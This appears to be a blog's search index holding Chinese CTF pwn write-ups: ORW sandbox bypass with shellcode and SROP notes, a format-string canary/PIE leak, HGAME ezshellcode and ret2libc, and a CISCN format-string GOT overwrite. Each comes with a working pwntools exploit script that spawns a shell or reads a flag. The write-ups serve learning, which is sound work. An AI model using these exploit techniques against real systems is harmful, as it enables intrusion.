<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>orw笔记(持续更新)</title>
      <link href="/2024/02/21/orw/"/>
      <url>/2024/02/21/orw/</url>
      
        <content type="html"><![CDATA[<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>orw禁用了系统调用，采用了沙箱技术开启了沙箱保护，我们不能正常的get shell，只能用ROP链来调用其他的函数，这时候需要通过调用open、read、write这样的函数打开flag</p><h2 id="沙箱函数"><a href="#沙箱函数" class="headerlink" title="沙箱函数"></a>沙箱函数</h2><p>原始的沙箱都是使用prctl()函数进行,所以能看见这个函数的时候一般都有开了沙箱</p><p><code>**prctl** ( int **option**,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</code></p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>可以通过<code>seccomp-tools</code>来判断是否添加沙箱，以及查看沙箱的规则</p><h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gcc ruby-dev</span><br><span class="line">$ gem install seccomp-tools</span><br></pre></td></tr></tbody></table></figure><h2 id="seccomp-tools的使用"><a href="#seccomp-tools的使用" class="headerlink" title="seccomp-tools的使用"></a>seccomp-tools的使用</h2><p><code>seccomp-tools dump ./pwn</code></p><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p>一般来说，orw这种类型的题都会有一个mmap函数来改写一个地址的读写权限，我们需要利用这块地址来构造ROP链。</p><p><code>void *mmap (void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用(x86下的shellcode,x64需要修改一下寄存器)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open('/home/orw/flag',0) </span><br><span class="line">s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''</span><br></pre></td></tr></tbody></table></figure><h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>开启NX保护的题目，无法执行shellcode，需要通过ROP来调用orw的三个函数</p><h3 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw orw"></a>pwnable.tw orw</h3><p>先checksec一下</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.1.png"></p><p>看一下函数逻辑</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.2.png"></p><p><img src="/2024/02/21/orw/pwnable.tw.orw.3.png"></p><p>先是orw_seccomp限定了orw，然后hint用shellcode过去</p><p>那么写exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="i386", log_level="debug")</span><br><span class="line"></span><br><span class="line">bss = 0x0804A040</span><br><span class="line"></span><br><span class="line">#p = process('./orw')</span><br><span class="line">p = remote('chall.pwnable.tw',10001)</span><br><span class="line">p.recvuntil('shellcode:')</span><br><span class="line"></span><br><span class="line">#open</span><br><span class="line">shellcode = asm("xor ebx,ebx;xor ecx,ecx;xor edx,edx;xor eax,eax;push ebx ;push 0x67616c66 ;push 0x2f77726f ;push 0x2f656d6f ;push 0x682f2f2f ;mov ebx,esp;mov al,0x5;int 0x80;")</span><br><span class="line"></span><br><span class="line">#read</span><br><span class="line">shellcode += asm("mov ebx,0x3;mov ecx,esp ;mov edx,0x40;xor eax,eax;mov al,0x3;int 0x80;")</span><br><span class="line"></span><br><span class="line">#write</span><br><span class="line">shellcode += asm("mov ebx,0x1;xor eax,eax ;mov al,0x4;int 0x80;")</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/orw/pwnable.tw.orw.4.png"></p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/2024/02/21/orw/SROP%E4%BF%A1%E5%8F%B7.png"></p><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p><p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p><p>需要注意的是，这一部分是在用户进程的地址空间的。</p><p>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p>我的理解是，触发信号之后会进入内核然后寄存器压栈，然后准备sigreturn的调用。</p><p><img src="/2024/02/21/orw/SROP%E6%A0%88%E7%BB%93%E6%9E%84.png"></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>如果我们伪造栈上的进程上下文再直接调用sigreturn系统调用，就能通过伪造的进程上下文中的各种寄存器随意设置寄存器、跳转任意地址</p><h2 id="利用set-context"><a href="#利用set-context" class="headerlink" title="利用set_context"></a>利用set_context</h2><p>(下面还没学，学完之后更新)</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>禁用free_hook则打malloc_hook</p><h2 id="House-of-KIWI"><a href="#House-of-KIWI" class="headerlink" title="House of KIWI"></a>House of KIWI</h2><p>参考博客：<a href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html">https://www.cnblogs.com/fuxuqiannian/p/17144953.html</a></p><p><a href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024.2.9</title>
      <link href="/2024/02/21/2024-2-9/"/>
      <url>/2024/02/21/2024-2-9/</url>
      
        <content type="html"><![CDATA[<h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p><p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p><p><img src="/2024/02/21/2024-2-9/ff.1.png"></p><p>因为要计算基址，先找到第19位程序的后四位地址再计算</p><p><img src="/2024/02/21/2024-2-9/ff.2.png"></p><p>然后找到后门函数位置</p><p><img src="/2024/02/21/2024-2-9/ff.3.png"></p><p>找到canary的偏移</p><p><img src="/2024/02/21/2024-2-9/ff.4.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process("./ff")</span><br><span class="line"></span><br><span class="line">p.sendline(b"%17$p-%19$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil("0x")</span><br><span class="line"></span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">ret = int(p.recv(15)[3:],16)</span><br><span class="line"></span><br><span class="line">base = ret - 0x146F</span><br><span class="line"></span><br><span class="line">cat = base + 0x1231</span><br><span class="line"></span><br><span class="line">payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/2024-2-9/ff.5.png"></p><p>(因为没自己写flag所以cat不到)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Week 2</title>
      <link href="/2024/02/06/week%202/"/>
      <url>/2024/02/06/week%202/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-PWN"><a href="#HGAME-PWN" class="headerlink" title="HGAME PWN"></a>HGAME PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>存在整数溢出，unsigned v4,输入-1，然后给一个shellcode</p><p>找一个shellcode放里面</p><p>shellcode来源：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='amd64',os='linux')</span><br><span class="line">p=process('./ezshellcode')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("of your shellcode:",b'-1')</span><br><span class="line"></span><br><span class="line">shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H</span><br><span class="line">0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1</span><br><span class="line">n0J0h0a070t"</span><br><span class="line"></span><br><span class="line">p.sendafter("input your shellcode:",shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p><p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p><p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])</span><br><span class="line"></span><br><span class="line">p = remote('106.14.57.14',30931)</span><br><span class="line"></span><br><span class="line">elf = ELF('./vuln')</span><br><span class="line">libc = cdll.LoadLibrary('./libc.so.6')</span><br><span class="line"></span><br><span class="line">libc.srand(0)  #找种子</span><br><span class="line"></span><br><span class="line">p.sendafter("thy name", b'a' * 0x12)</span><br><span class="line"></span><br><span class="line">for i in range(0,99):</span><br><span class="line">    m = libc.rand()%100+1</span><br><span class="line">    # print(m)</span><br><span class="line">    p.sendafter("guess the number:",p64(m)) </span><br><span class="line">    </span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x401423</span><br><span class="line">ret = 0x40101A</span><br><span class="line"></span><br><span class="line">read = 0x401250 </span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">p.sendafter("thy brilliant mind.",payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']</span><br><span class="line">                 </span><br><span class="line"># print("libc_base=",hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(libc_base+next(libc.search(b'/bin/sh')))</span><br><span class="line">payload+=p64(libc_base+libc.sym['system'])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p><p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p><p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line">elf = ELF(pwn)</span><br><span class="line">#rop = ROP(pwn)</span><br><span class="line"></span><br><span class="line">libc =elf.libc</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"your name?\n")</span><br><span class="line"></span><br><span class="line">fini = 0x0804979C  </span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">printf_addr = elf.got['printf']</span><br><span class="line">main = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"What's your name?\n")</span><br><span class="line"></span><br><span class="line">io.sendline(b'/bin/sh\x00')</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
